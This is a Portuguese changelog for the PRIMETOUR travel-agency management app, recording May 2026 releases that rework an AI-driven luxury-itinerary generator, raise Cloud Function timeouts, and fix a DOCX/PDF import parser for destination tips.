# Changelog — Gestor PRIMETOUR

Todas as mudanças relevantes do sistema. Formato baseado em [Keep a Changelog](https://keepachangelog.com/pt-BR/) — segue [SemVer](docs/VERSIONING.md).

> **Sobre a calibragem inicial**: `js/version.js` foi formalizado em 05/05/2026, no commit `722a2ab`. Antes disso, a app passou por meses de desenvolvimento sem versionamento estruturado (~1.161 commits entre 13/03 e 05/05/2026, incluindo migrações de schema, refactors arquiteturais, novos módulos e hardening de segurança em 5 sprints). Os blocos `[1.x]` e `[2.x]` abaixo consolidam esse histórico em fases retrospectivas; granularidade fina segue em `git log`. A partir de `3.0.0`, todo bump é rigoroso (ver [docs/VERSIONING.md](docs/VERSIONING.md)).

---

## [4.49.83+20260522-roteiros-briefing-limpo-sem-poluicao] — 2026-05-22

Release **PATCH** — Briefing do roteiro limpo (Commit 2/2 do plano UX).

**Antes** (v4.49.82): 3 frases redundantes no topo, placeholders longos
parecendo manual, texto técnico no card de destinos, checklist "🔒
Para gerar com IA, ainda falta", box "✅ Briefing pronto" com info
técnica (Sonnet 4.5, prompt caching), botão custom `.re-ai-btn` com
estilo próprio.

**Depois**:

1. **Intro** uma linha só: "Resumo do cliente e da viagem. Campos
   com * são obrigatórios."
2. **Ordem dos campos** reorganizada — primeiro o que DEFINE a viagem
   (Destinos → Datas), depois o que DEFINE o cliente (Tipo,
   Orçamento → Perfil → Interesses/Restrições), depois notas livres.
3. **Placeholders curtos**: "casal 55-60, cultural e gastronômico"
   em vez de parágrafo inteiro como exemplo.
4. **Card destinos** sem texto técnico ("Os destinos vêm do banco
   compartilhado..."). Toggle "Quero sugestão do agente" simples.
5. **Botão "+ Cadastrar destino novo"** usa classe padrão
   `.btn .btn-ghost btn-sm` (era `.re-add-btn--gold` custom).
6. **Bloco IA**: botão único `.btn .btn-primary` sempre visível.
   Quando há campos faltando, **hint discreto inline** ao lado:
   "Falta: tipo de viagem · perfil · datas". Sem checklist
   amarelo, sem box "✅ pronto", sem info técnica.
7. **CSS removido**: `.re-briefing-ai--ready`, `.re-briefing-ai-msg`,
   `.re-briefing-ai-meta`, `.re-briefing-ai-checklist`, `.re-ai-btn`
   (+ variantes). Mantida só `.re-briefing-ai` (wrapper simples) +
   `.re-briefing-ai-hint`.
8. **Título da seção**: "Briefing pra geração com IA" (sem emoji
   no h2 — o ícone da sidebar já comunica).
9. **`btn-ghost` consistente** nas ações secundárias do card de
   destinos.

**Validação**: `node --check` ok. E2E pendente.

---

## [4.49.82+20260522-roteiros-ux-listagem-editor-padrao-sistema] — 2026-05-22

Release **PATCH** — UX/visual do gerador de roteiros alinhado ao
padrão do sistema (Commit 1 do plano UX).

**Contexto** (Renê auditando): "se não fica parecendo que tem vários
sistemas em um só".

### Listagem (`js/pages/roteiros.js`)

- **Removido** botão "Criar com IA" do header — era redundante com
  "+Novo Roteiro" (ambos abriam editor). Geração via IA agora vive
  exclusivamente dentro da Seção 0 Briefing.
- Handler `ai-create` mantido como backward-compat (redireciona pro
  fluxo novo).
- Botão **"Exportar"** renomeado pra **"Exportar lista"** — deixa
  explícito que é a lista filtrada (export individual de roteiro
  fica no editor).
- **Filtros avançados colapsáveis**: Status pills + search + period
  continuam sempre visíveis (essenciais). Selects de Área/Destino/
  TipoCliente/Consultor vão pra `<details>` com summary "Filtros
  avançados" (open quando há filtro ativo, fechado caso contrário).
  Reduz poluição inicial.

### Editor header (`js/pages/roteiroEditor.js`)

- Substituído `<div class="re-header">` por **`<div class="page-header">`**
  (igual ao resto do sistema).
- Botões agora usam classes padrão: **`.btn .btn-ghost btn-sm`** pra
  Voltar, **`.btn .btn-secondary btn-sm`** pra Exportar PDF,
  **`.btn .btn-primary btn-sm`** pra Salvar. Antes eram todos
  `.re-add-btn` com border tracejada.
- **Removido botão "✨ IA"** do header (era duplicado — geração via
  IA já vive dentro do Briefing). Cor gradient roxo
  `linear-gradient(#7c3aed → #a855f7)` apagada.
- `re-header-title` (custom) virou **`<h1 class="page-title">`**.
- `re-autosave-status` agora discreto (font-size 0.75rem, var(--text-muted));
  fica VAZIO quando carregado (antes mostrava "Carregado" sempre).

### Regra documentada no CLAUDE.md

Após audit detalhado dos erros (commit `a936bbe`), nova seção §4 do
projeto + §2 user-level: **"SEMPRE respeitar o padrão visual do
sistema existente"**. Procedimento obrigatório antes de criar UI:
auditar 2-3 páginas-modelo, identificar classes/vars, reusar uiKit.
Anti-padrões listados (gradient, dashed, RGBA hardcoded, classes
custom, emoji-only labels, placeholders parecendo manual,
mensagens técnicas pra usuário).

**Próximo (Commit 2)**: limpar a Seção Briefing — remover intro
redundante, encurtar placeholders, remover checklist "🔒 falta",
mover info técnica pra Observações IA.

**Validação**: `node --check` ok nos 2 arquivos. E2E pendente
(usuário valida visualmente com hard refresh).

---

## [4.49.81+20260522-httpsCallable-client-timeout-300s] — 2026-05-22

Release **PATCH** — `httpsCallable` client-side ainda usava timeout
default (70s). Mesmo após v4.49.80 (CF server-side 300s), o navegador
cortava a chamada aos ~70s. Adicionado `{ timeout: 300_000 }` em
ambas as chamadas:

- `js/services/aiSecure.js` — função genérica `callable(name, data)`
- `js/services/ai.js` — `callAnthropic` (fallback legacy)

Agora cliente e servidor têm o mesmo limite. Agente de roteiros
(Sonnet 4.5 + web_search forçado, geração ~150s) consegue completar.

**Validação**: `node --check` ok nos 2 arquivos.

---

## [4.49.80+20260522-callLLM-timeout-300s] — 2026-05-22

Release **PATCH** — Cloud Function `callLLM` timeout 120s → 300s.

**Bug encontrado validando v4.49.79**: ao disparar agente
roteiros-luxo-gen com web_search forçado (v3 do system prompt),
o Cloud Function estourava `deadline-exceeded` aos ~120s. Stack:

```
[runAgent] Cloud Function falhou, fallback chatWithAI: [functions/deadline-exceeded] deadline-exceeded
[ai-roteiro] Erro: Error: Erro Anthropic (Cloud Function): deadline-exceeded
```

**Causa**: Sonnet 4.5 + system prompt 10370 chars + web_search 5 buscas
máx + JSON estruturado ~6kB → tempo total da chamada ultrapassa 2 min.

**Fix**: `functions/index.js:callLLM` `timeoutSeconds: 120 → 300`.
Firebase 2nd gen onCall permite até 540s; deixei 300s pra balancear
custo de invocação travada × risco de cortar agente legítimo.

**Deploy**: `firebase deploy --only functions:callLLM` ✓.

**Validação**: deploy successful; E2E pendente após GH Pages publicar.

---

## [4.49.79+20260522-roteiros-imagens-auto-websearch-forcado] — 2026-05-22

Release **PATCH** — 2 melhorias na geração via IA: auto-resolve de
imagens + web_search obrigatório.

### 1. Auto-resolve imagens (task #14 Sprint C)

Após `_applyAiOutputToRoteiro` (que preenche days/hotels), agora
dispara nova função **`_enrichImagesAfterAi()`** que:

- Carrega banco de imagens local (\`fetchImages({})\` da collection
  \`portal_images\`)
- Pra cada slot do roteiro (hero, cada cidade, cada hotel) chama
  `resolveDestinationImage(dest, null, bank, { excludeUrls })` que
  segue a cascata: **banco interno → Unsplash → Wikipedia**
- Popula `currentRoteiro.images.overrides.hero` + `city_<slug>` +
  `hotel_<i>` (mesmas keys do picker manual — então fica visível
  na aba Imagens imediatamente, e usuário pode trocar se quiser)
- `Set excludeUrls` garante dedup entre slots (hero ≠ city ≠ hotel)
- Não-bloqueante: erro em 1 cidade não para o resto

### 2. Web_search obrigatório (task #17)

System prompt do agent `roteiros-luxo-gen` ganhou nova seção:

> **"## Web search é OBRIGATÓRIO"** — instrui o modelo que cenários
> típicos exigem busca (confirmar Virtuoso/FHR/LHW, amenities,
> eventos sazonais, acessibilidade) e que roteiros sem ≥ 1 busca
> são "incompletos — você perde a garantia de zero alucinação".

System prompt cresceu de 9736 → 10370 chars (caching segue ativo).
Re-seed rodado via `scripts/seed-roteiros-luxo-agent.js`.

**Validação**: `node --check` ok. Agent doc no Firestore atualizado.

---

## [4.49.78+20260522-roteiros-briefing-layout-alinhado] — 2026-05-22

Release **PATCH** — Briefing do gerador de roteiros refeito pra
seguir o padrão visual do próprio editor (classes `.re-*`).

**Contexto** (Renê): "nao me parece que o layout do briefing esta
alinhado ao layout do sistema... eu vou ter que falar item por
item pra vc alterar ou vc vai fazer uma varredura geral?"

**Auditoria** (agent Explore varreu portalImport.js,
portalDashboard.js, portalDestinations.js vs roteiroEditor.js
linha-a-linha). Achados principais aplicados:

1. **Inputs**: deixaram de ter `style="padding:6px 10px;background:
   transparent;border:..."` inline → agora usam `class="re-input"`
   (consistente com Cliente/Viagem/Hotéis).
2. **Selects**: idem → `class="re-select"`.
3. **Textareas**: idem → `class="re-textarea"`.
4. **Grid 2 colunas**: `style="display:grid;grid-template-columns:
   1fr 1fr;gap:14px;"` → `class="re-grid-2"`.
5. **Labels**: `<label>...` sem classe → `<label class="re-label">`
   (uppercase, letter-spacing, mesma identidade do resto).
6. **Asterisco obrigatório**: `<span style="color:#EF4444">*</span>`
   → `<span class="re-required">*</span>` (classe reutilizável).
7. **Card de destinos**: cor hardcoded `rgba(124,58,237,0.06)` /
   `border-left:3px solid #7c3aed` → `var(--bg-surface)` +
   `var(--brand-blue)` (segue tema).
8. **Linhas de destino** (input cidade/país/noites + remover):
   grid 4 colunas (`2fr 2fr 100px 36px`) com gap consistente.
   Remover usa `.re-remove-btn` (igual ao resto do editor).
9. **Botão "Cadastrar destino novo"**: nova variante
   `.re-add-btn--gold` (cor brand-gold) — sem inline styles.
10. **Bloco "Gerar com IA"**: deixou de ter gradient roxo
    hardcoded + box-shadow inline. Agora usa
    `.re-briefing-ai` + variantes `--ready`/`--blocked`, com
    `var(--brand-blue)` como cor principal (alinhado ao tema do
    editor). Botão grande usa `.re-ai-btn--primary`.
11. **Checklist do que falta**: classe `.re-briefing-ai-checklist`
    em vez de `style="list-style:none;..."` inline.
12. **Responsive**: `@media (max-width:768px)` reflow específico
    pra `.re-briefing-dest-row` (grid colapsa pra 2x2).

**Resultado**: zero cores hardcoded (rgba), zero styles inline de
input/select/textarea, tipografia/spacing 100% via classes
existentes do editor. O Briefing agora se parece com Cliente,
Viagem, Hotéis e demais seções.

**Validação**: `node --check` ok.

---

## [4.49.77+20260521-roteiros-checkbox-collect-fix] — 2026-05-21

Release **PATCH** — bugfix: checkboxes não persistiam.

**Bug encontrado validando v4.49.76 no Chrome**: ao marcar
checkbox "🔮 Quero que o agente sugira destinos", o estado se
perdia no próximo re-render. Causa: `collectFormData()` lia
`input.value` (retorna string "on" pra checkboxes) em vez de
`input.checked` (boolean).

**Fix em `collectFormData`**: nova branch específica pra
`input.type === 'checkbox'` que lê `input.checked === true`.
Afeta TODOS os checkboxes do editor (qualquer `[data-field]`
com type=checkbox).

**Validação**: `node --check` ok.

---

## [4.49.76+20260521-roteiros-cadastro-destino-inline-bug-fix] — 2026-05-21

Release **PATCH** — fixes encontrados validando v4.49.75 + cadastro
inline de destinos novos.

**Bug 1**: novo roteiro era inicializado inline em
`renderRoteiroEditor` SEM o campo `briefing` (ignorava `emptyRoteiro()`).
Inputs do briefing ficavam disconnect do state, valores não persistiam
no re-render. **Fix**: inline init agora inclui `briefing{}` + defensive
default pra roteiros antigos sem o campo.

**Bug 2** (resolvido pela parte 4 da v4.49.75): user pedia destino
do banco compartilhado. **Confirmado**: datalist mostra os 60+ destinos
do `portal_destinations` em produção.

**Novo**: **botão "+ Cadastrar destino novo (no banco)"** ao lado do
"+ Adicionar à lista" no Briefing. Abre modal idêntico ao do Portal
de Dicas (continente, país obrigatório, cidade opcional). Após salvar:
1. `saveDestination(null, {…})` grava em `portal_destinations`
2. `fetchDestinations()` recarrega allDestinations (datalist atualiza)
3. Destino cadastrado é adicionado AUTOMATICAMENTE à lista de
   destinos do briefing atual
4. Re-render

Aviso visível abaixo dos botões: "Os destinos vêm do banco
compartilhado de Destinos (mesma fonte do Portal de Dicas e Banco
de Imagens). Se o destino não está na lista, cadastre pra ficar
disponível em todos os módulos."

**Validação**: `node --check` ok. E2E real pendente.

---

## [4.49.75+20260521-roteiros-briefing-secao-ia-fluxo-claro] — 2026-05-21

Release **PATCH** — UX do gerador de roteiros: briefing como Seção 0
+ botão IA contextualizado + agente capaz de sugerir destinos.

**Contexto** (Renê): "tem botao de criar com IA antes mesmo de solicitar
novo roteiro... ele dá erro automático porque alega que não escolhi
destino... a ideia não é ele primeiro receber a solicitação do
consultor, entender as necessidades, que tipo de cliente é... para
depois ele atuar? o UX disso está torto".

**Mudanças**:

1. **Nova Seção 0 "Briefing"** (antes de Cliente):
   - Tipo de viagem (10 opções: lua-de-mel, cultural, gastronômica…)
   - Faixa de orçamento (4 níveis: standard → ultra-luxury)
   - Perfil dos viajantes (textarea)
   - Interesses + restrições (textareas)
   - Datas (início + fim)
   - Lista de destinos editável (autocomplete via `<datalist>` com
     destinos cadastrados em `portal_destinations`)
   - Checkbox **"🔮 Quero que o agente sugira destinos baseado no
     briefing"** — quando marcado, destinos viram opcionais
   - Contexto livre (textarea)

2. **Botão "✨ Gerar com IA" sai do header global**:
   - Vira botão grande, gradient roxo, dentro da Seção Briefing
   - Só ativo (clicável) quando briefing mínimo está preenchido
   - Quando faltam campos, mostra checklist amarelo do que falta
   - Header tem agora atalho "✨ IA" que abre a Seção Briefing

3. **Validação inteligente** em `aiGenerateFullRoteiro`:
   - Valida BRIEFING (tipo + perfil + datas) em vez de
     "destino obrigatório" cego
   - Se `querSugestaoDestino === true`, destinos viram opcionais
   - Em caso de falta, redireciona usuário pra aba Briefing
     (`switchSection(0)`) com toast explicativo

4. **Agent system prompt v2** (re-seeded):
   - Nova seção "Briefing como entrada" explicando o formato estruturado
   - Nova seção "Modo especial: sugestão de destinos" com critérios
     (coerência, sazonalidade, logística, orçamento)
   - Schema JSON ganhou campo `destination_suggestions[]` (label,
     destinations[], rationale) — obrigatório em modo sugestão
   - System prompt: 7497 → **9736 chars** (caching ephemeral ativo)

5. **Schema do roteiro** (`emptyRoteiro`):
   - Novo bloco `briefing{tipoViagem, perfilViajantes, interesses,
     restricoes, orcamentoFaixa, contextoLivre, querSugestaoDestino}`

6. **Handlers**:
   - `go-briefing` (header → abre Seção 0)
   - `add-brief-dest` / `remove-brief-dest` (manipular lista de
     destinos no briefing)
   - `ai-generate-full` agora dispara contextual error UX

7. **Renumeração de SECTIONS**: todas deslocadas +1 (Cliente=1,
   Viagem=2, Dia-a-dia=3, …, Observações IA=15).

**Validação**: `node --check` ok. Seed do agente rodado (9736 chars
no system prompt). E2E real pendente.

---

## [4.49.74+20260521-roteiros-ai-agent-luxo-virtuoso-fhr-lhw] — 2026-05-21

Release **MINOR-importante** — Agente de IA pra geração de roteiros
de luxo (Claude Sonnet 4.5 + web_search restrito Virtuoso/FHR/LHW).

**Contexto** (Renê): "estruturar o agente de IA via API Claude para
gerar roteiros... especialista em viagens de alto padrão... hotéis
Virtuoso e FHR... em hipótese alguma pode inventar dados... campo
de observações da consulta exibindo fontes consultadas".

**Fase 1 entregue**:

1. **Backend — Cloud Function `callLLM` estendida**:
   - Aceita `allowedDomains[]` no web_search (whitelist do Anthropic
     `web_search_20250305`). Antes só passava `max_uses`.
   - `webSearchMaxUses` configurável (default 3, agente luxo usa 5).
   - Response expandido pra retornar `webSearchQueries`, `webSearchResults`
     (URL+title+page_age), e `citations` (links de fato citados no texto).
   - Propaga em `js/services/ai.js`, `aiSecure.js`, `agents.js`.

2. **Agent `roteiros-luxo-gen`** criado no Firestore `ai_agents`:
   - `model: claude-sonnet-4-5` (Sonnet 4.5, latest 2025-09).
   - `systemPrompt` extenso (~7500 chars → prompt caching ephemeral
     ativo, cache hit paga ~10% do input).
   - `allowedSites: ['virtuoso.com','americanexpress.com','lhw.com']`.
   - `outputFormat: 'json'` com schema completo (title, narrative_overview,
     destinations[], days[], hotels[] com `program` field, includes/excludes,
     consultant_notes, sources_consulted).
   - Diretrizes anti-alucinação explícitas; tom requintado mas acolhedor;
     lógica de logística (jet lag, sazonalidade, agrupamento geográfico).
   - Visível pra admin/master/manager/consultor.
   - Limites: 8k max_tokens, temp 0.5, cap $10/dia, timeout 90s.
   - Seed em `scripts/seed-roteiros-luxo-agent.js` (ADC ou env vars).

3. **Schema do roteiro** estendido (`js/services/roteiros.js:emptyRoteiro`):
   - Novo bloco `aiGeneration{enabled, sources[], queries[], citations[],
     promptVersion, generatedAt, lastInput, consultantNotes, webSearchCount,
     inputTokens, outputTokens}`.
   - Não exposto no PDF/PPT exportado.

4. **Editor de roteiros** (`js/pages/roteiroEditor.js`):
   - Botão **"✨ Gerar com IA"** no topo (gradient roxo), ao lado de Salvar.
   - Handler `aiGenerateFullRoteiro()`: collectFormData → monta userMessage
     → `runAgent('roteiros-luxo-gen')` → parse JSON → preenche days[],
     hotels[], includes/excludes, narrativa, sources em `aiGeneration`.
   - Confirma antes de sobrescrever conteúdo existente.
   - Loader visual durante geração (30-60s típico).
   - Nova aba **"✨ Observações IA"** (índice 14): fontes consultadas
     (URLs clicáveis), citações inline, queries, notas editáveis do
     consultor, debug do input enviado. **Não vai pro PDF/PPT**.

**Validação**: `node --check` ok em 6 arquivos. Cloud Function
deployada. Seed do agent rodado no Firestore. E2E real do botão
pendente (precisa user logado pra testar).

**Próximas fases** (pra commits futuros):
- Knowledge base de roteiros pré-prontos (offline) pra alimentar o agente.
- Tool use loop pra consulta iterativa em base interna.
- Streaming da resposta (UX).
- Few-shot examples com roteiros aprovados de produção.

---

## [4.49.73+20260521-portal-import-docx-ext-dropdown-hier] — 2026-05-21

Release **PATCH** — 2 fixes encontrados validando o fluxo de
overwrite em produção.

**Bug 1 — `parseFileName` não tirava .docx**: regex
`/\.[pP][dD][fF]$/` só removia `.pdf`. Arquivos DOCX ficavam com
".docx" no nome da cidade ("Cape Town.docx"), não batiam em
nenhum destino cadastrado. **Fix**: regex passou a aceitar `pdf`,
`doc`, `docx`, `xls`, `xlsx`.

**Bug 2 — dropdown plano de destinos** (Renê): "o campo lista de
destinos para escolher manualmente precisa estar melhor dividida
(separada por continente e país)". Lista plana com 59+ destinos
era ruim de varrer. **Fix**: usar `<optgroup label="<continente>">`
agrupando destinos por continente; dentro de cada optgroup,
ordenado por país → cidade. Formato da option mudou de
"Cidade · País · Continente" para "País — Cidade".

**Validação**: `node --check` ok.

---

## [4.49.72+20260521-portal-import-overwrite-existing-tip-warn] — 2026-05-21

Release **PATCH** — Portal de Dicas/Importação: detecta tips
existentes e exige confirmação antes de sobrescrever.

**Contexto** (Renê): "ele não aceita destinos que já possuem
conteúdo, correto? ele deve, ao menos, informar o user que já tem
dica cadastrada e que essa ação vai remover a informação antiga
e colocar a nova".

**Bug pré-existente identificado**: linha 999 do `portalImport.js`
fazia `segments = tip?.segments ? { ...tip.segments } : {}` — isto
é, MERGE com tip existente. Ao reimportar, items eram **duplicados**
em vez de substituídos.

**Mudanças em `js/pages/portalImport.js`**:

1. **`renderReviewBody` pre-fetch de tips**: após classificar destinos,
   `Promise.all` chama `fetchTip(destDoc.id)` em paralelo. Tip
   encontrado fica em `c.existingTip` com `{id, segmentCount,
   segmentLabels}` + também em `dest.__existingTip` pra acesso no
   runImport.

2. **Card mostra warning**: bloco vermelho com border `#EF4444`:
   *"🔄 Este destino já tem dica cadastrada (N segmentos: <lista>).
   Importar vai SUBSTITUIR o conteúdo antigo pelos items deste
   arquivo."*

3. **`openOverwriteConfirmModal`**: ao clicar "Confirmar e Importar",
   se houver ≥ 1 destino com `existingTip`, abre modal listando os
   destinos afetados + segmentos atuais. Botão **"🔄 Confirmar
   substituição"** (vermelho) explícito pra prosseguir. Cancelar
   aborta sem mudança.

4. **`runImport` OVERWRITE**: `segments = {}` sempre (era merge).
   Log adiciona linha âmbar *"🔄 Sobrescrevendo dica existente (N
   segmento(s) antigo(s))"* pra cada destino afetado.

**Validação**: `node --check` ok.

---

## [4.49.71+20260521-portal-import-parser-fuzzy-tighter] — 2026-05-21

Release **PATCH** — fix de detecção falso-positivo: descrições
começando com palavra-chave de segmento eram tratadas como
subtítulo, dividindo o block do item em pedaços.

**Bug encontrado** rodando suite adversarial v4.49.70:
- DOCX com item "21 Restaurant" + descrição "Restaurante moderno
  fusão árabe-francesa." em parágrafos sucessivos.
- `detectByKeywords("Restaurante moderno fusão árabe-francesa.")`
  casava o prefix "restaurante " e criava nova seção
  `restaurantes` no meio do block. Resultado: "21 Restaurant"
  ficava órfão sem descrição e era filtrado fora.

**Mudanças em `js/services/portalPdfParser.js`**:

1. **`detectByKeywords` mais restrito**:
   - Limite reduzido: ≤ 4 palavras (era 6).
   - Linha com ponto final (`.!?,;`) → não é subtítulo.
   - Linha com URL → não é subtítulo.
   - Linha com sequência de 4+ dígitos (telefone/CEP) → não é
     subtítulo.
   - `startsWith(kw + ' ')` só vale se a linha tem ≤ 1 palavra
     extra após o kw (impede "restaurante moderno..." casar).

**Validação**: `node --check` ok. Adversarial test pendente.

---

## [4.49.70+20260521-portal-import-granular-review-modal] — 2026-05-21

Release **PATCH** — Portal de Dicas/Importação: UI granular de
revisão de items detectados.

**Contexto**: o parser v4.49.66-69 detecta items via heurística
de subtítulos. Agora o usuário precisa de uma tela pra **revisar
a alocação proposta** antes de importar — editar título/descrição,
mover items entre segmentos, ou remover items errados.

**Mudanças em `js/pages/portalImport.js`**:

1. **Botão "📝 Revisar items (N)"** em cada card de destino no
   review, ao lado do badge de cadastro.

2. **Modal granular** (`openGranularReviewModal`):
   - Items agrupados por segmento em `<details>` expansíveis.
   - Items sem segmento atribuído ficam em grupo "⚠ Items sem
     segmento" sempre aberto, com border âmbar.
   - Cada item é uma row com formulário:
     - Título (texto)
     - Segmento (dropdown com SEGMENTS — obrigatório pra items
       órfãos, com asterisco vermelho)
     - Categoria (texto, opcional)
     - Descrição (textarea)
     - Endereço, Telefone, Site (texto)
   - Linha "📄 Detectado a partir de: ..." mostra o
     `__originalHeading` quando o item veio de heading não
     reconhecido.
   - Botão "🗑 Remover item" por linha.
   - Botões globais "Cancelar" (rollback via snapshot) e
     "✓ Aplicar revisão" (sincroniza com `parsedImportData`).

3. **`_syncDestItemsToParsedImportData`**: reconstrói
   `parsedImportData` global a partir das edições, filtrando
   items sem segmento ou sem título.

4. **Persistência via reference**: como `dest.items` é referência
   pros mesmos objetos do `parsedImportData`, edições inline
   atualizam o estado vivo. "Cancelar" restaura via snapshot.

**Próximo**: validação real com DOCX de produção.

---

## [4.49.69+20260521-portal-import-parser-prefix-no-split] — 2026-05-21

Release **PATCH** — fix: `_looksLikeItemTitle` agora exclui
prefixes COMPLETOS de contato (não só "Tel"/"Site" curtos).

**Bug encontrado validando v4.49.68**: La Sqala ficou com endereço
mas SEM telefone. Causa: `_looksLikeItemTitle("Telefone: +212...")`
retornava `true` (porque o regex de exclusão só pegava "Tel:"
curto, não "Telefone:"). Resultado: `splitBlockIntoItems` quebrava
o block do La Sqala em 2 items, e o segundo ("Telefone: +212...")
sem descrição era filtrado fora.

**Mudança**: `_looksLikeItemTitle` agora usa `CONTACT_PREFIXES`
completo (mesma fonte de verdade do `extractContactFields`) pra
excluir telefone/site/endereco/email + outros padrões
(horário/metrô/valor/preço/categoria/tipo/estilo).

---

## [4.49.68+20260521-portal-import-parser-contact-prefixes] — 2026-05-21

Release **PATCH** — Portal de Dicas/Importação: parser reconhece
prefixes completos de contato ("Telefone:", "Endereço:", "Site:").

**Bug encontrado validando v4.49.67**: `extractContactFields` só
reconhecia "Tel:" e "Link:". Linhas como "Telefone: +212..." ou
"Endereço: Boulevard..." eram tratadas como descrição livre,
poluindo o campo `descricao` dos items.

**Mudança em `js/services/portalPdfParser.js`**:

- **`CONTACT_PREFIXES`** — tabela de regex por campo:
  - `telefone`: `tel | telefone | fone | phone | telephone | whatsapp | wpp`
  - `site`: `site | website | url | link | web`
  - `endereco`: `endereço | endereco | address | end. | location | local`
  - `email`: `email | e-mail | correio` (concatena em telefone se vazio)
  - Aceita separadores `:`, `.`, `-`, `–` opcionais.

- **`extractContactFields`** reescrito: varre na ordem (start→end)
  em vez de backwards, classifica cada linha pelo prefix, faz
  fallback de endereço pra última linha com dígito ou keyword
  de rua (Boulevard, Avenida, Rue, etc).

**Validação no Chrome**: rodar com DOCX sintético deve agora
preencher corretamente endereco/telefone/site dos items.

---

## [4.49.67+20260521-portal-import-parser-title-case-items] — 2026-05-21

Release **PATCH** — Portal de Dicas/Importação: parser aceita
títulos de items em Title Case (não apenas MAIÚSCULAS).

**Contexto**: validando v4.49.66 no Chrome com DOCX sintético
de Casablanca, descobri 2 bugs adicionais:

1. **`extractDocxLinesWithHeadings`** adicionava blank line após
   cada `<p>`, criando blocks separados pra cada parágrafo.
   Resultado: "La Sqala" + "Restaurante tradicional..." +
   "Endereço: ..." virava 3 blocks de 1 linha em vez de 1 item.
2. **`parsePlaceList`** (linha 524) exigia `isAllCaps(firstLine)`
   na primeira linha do bloco. Items Title Case ("La Sqala",
   "Rick's Café") eram silently dropped.

**Mudanças em `js/services/portalPdfParser.js`**:

1. **`extractDocxLinesWithHeadings`**: blank line agora só envolta
   de heading e listas (`<ul>/<ol>`). Parágrafos sucessivos `<p>`
   ficam contíguos pra `splitBlocks` preservar items multi-linha.

2. **`_looksLikeItemTitle(line)`**: heurística pra detectar início
   de novo item (≤ 60 chars, sem ponto final, sem prefix de
   endereço/telefone/site, começa com maiúscula).

3. **`splitBlockIntoItems(block)`** dentro de `parsePlaceList`:
   sub-divide um block em items individuais por linhas que
   "parecem título". Necessário porque DOCX com Word headings tem
   items sucessivos sem blank line entre eles.

4. **Validação de item flexível** em `parsePlaceList`: aceita
   AllCaps (legacy) OU dígito inicial OU `_looksLikeItemTitle`.

5. **`parseSimpleList`** (Bairros/Arredores) refeito: aceita
   formato "Nome: descrição" (típico Title Case) + linhas de
   continuação.

**Próximo**: UI granular pra editar/aprovar items por segmento.

**Validação**: `node --check` ok. E2E pendente no Chrome.

---

## [4.49.66+20260521-portal-import-parser-heuristico-subtitulos] — 2026-05-21

Release **PATCH** — Portal de Dicas/Importação: parser DOCX/PDF
heurístico (sem LLM) que correlaciona subtítulos a segmentos.

**Contexto** (Renê): "vc correlaciona o conteúdo e propoe a
alocacao do conteudo a partir dos subtitles... sem LLM."

**Antes**: `splitIntoSections` em `portalPdfParser.js` exigia
match exato com `TOP_SECTIONS` (MAIÚSCULAS, sem variação).
Arquivos com "Restaurantes" em Title Case ou "Onde Comer" eram
ignorados.

**Mudanças em `js/services/portalPdfParser.js`**:

1. **Tabela `SEGMENT_KEYWORDS`** — mapeia subtítulos comuns pra
   segment keys via palavras-chave normalizadas (lowercase, sem
   acento, sem pontuação):
   - `restaurantes` ← "Restaurante", "Onde Comer", "Gastronomia"
   - `vida_noturna` ← "Vida Noturna", "Bares", "Baladas"
   - `atracoes` ← "Atrações", "Pontos Turísticos", "O Que Fazer"
   - `bairros` ← "Bairros", "Regiões"
   - `arredores` ← "Arredores", "Day Trip", "Bate-Volta"
   - `compras` ← "Compras", "Shoppings"
   - `espetaculos` ← "Espetáculos", "Teatros", "Broadway"
   - `highlights` ← "Highlights", "Destaques"
   - etc.

2. **`detectByKeywords(line)`** — match fuzzy do subtítulo
   contra `SEGMENT_KEYWORDS`. Vence o segmento com palavra-chave
   mais longa casada. Restringe a linhas curtas (≤ 6 palavras)
   pra evitar match em parágrafo.

3. **`looksLikeHeading(line)`** — heurística: linha é curta,
   sem ponto final, capitalizada, sem URL/telefone/endereço.
   Reforça confidence quando combinada com keyword match.

4. **`extractDocxLinesWithHeadings(file)`** — usa
   `mammoth.convertToHtml()` (em vez de `extractRawText`) e
   detecta `<h1-h6>` do estilo do Word. Linhas que vinham de
   headings recebem marker `​` (zero-width space).
   Headings reconhecidos pelo Word elevam confidence pra `high`
   mesmo em Title Case. Fallback pra `extractRawText` se HTML
   falhar.

5. **`detectSection(line, surrounding)`** — 2 estágios:
   - Estágio 1: match exato em `TOP_SECTIONS` (alta).
   - Estágio 2: match fuzzy por keywords (high/medium/low
     conforme o "format score" + "isolated score").

6. **Seção `__unclassified`** — headings reconhecidos pelo
   Word mas sem match em keywords criam seção marcada como
   "precisa revisão". Items recebem `__needsReview: true` e
   `__originalHeading` pra UI surfacear.

**Mudanças em `js/pages/portalImport.js`**:
- Card de destino no review mostra aviso âmbar
  "⚠ N item(s) precisam revisão de segmento" listando os
  subtítulos originais não reconhecidos.

**Próximo passo**: UI de revisão por item (editar
título/descrição/segmento inline) — fica pra v4.49.67.

**Validação**: `node --check` ok nos 2 arquivos.

---

## [4.49.65+20260521-portal-import-vincular-manual-destino] — 2026-05-21

Release **PATCH** — Portal de Dicas/Importação: vinculação manual a
destino existente.

**Contexto** (Renê): "tentei subir o arquivo
áfrica - marccos - casablanca.docx e o sistema não identificou o
destino, mas ele já está cadastrado. não é melhor vc solicitar ao
user pra ele vincular ao destino que deseja?"

**Diagnóstico**: usuário digitou "marccos" no nome do arquivo
(typo de "Marrocos"). O `_matchDest` falhava em todas as camadas
porque a normalização não cobre typos. A sugestão fuzzy mostrava
"Casablanca, Marrocos" (achou pela cidade), mas usuário tinha que
renomear o arquivo ou cadastrar de novo — fluxo ruim quando o
destino já existe.

**Mudanças em `js/pages/portalImport.js`**:

1. **Vinculação manual** — cada card de destino "não cadastrado"
   ganha um painel novo com 3 ações:
   - **✓ Vincular a este** — botão que aceita a sugestão fuzzy
     direto.
   - **Escolher manualmente** — dropdown com TODOS os destinos
     cadastrados (ordenados por continente → país → cidade).
   - **+ Cadastrar novo destino** — caminho original preservado.

2. **`byDest[key].manualMapping`** — guarda o `destDoc.id` quando
   user vincula. Persiste no re-render. Botão **Desfazer**
   aparece quando vinculação é manual.

3. **`_matchDest` ainda corre primeiro**; manualMapping tem
   precedência apenas se existir. Garante que matches automáticos
   bons continuam funcionando.

4. **`runImport`** — checa `dest.manualMapping` antes de
   `_matchDest`. Log mostra "🔗 Vinculado a X" quando usado.

5. **`renderReviewBody`** detecta ID stale (destino deletado
   entre review e re-render) e descarta `manualMapping` órfão.

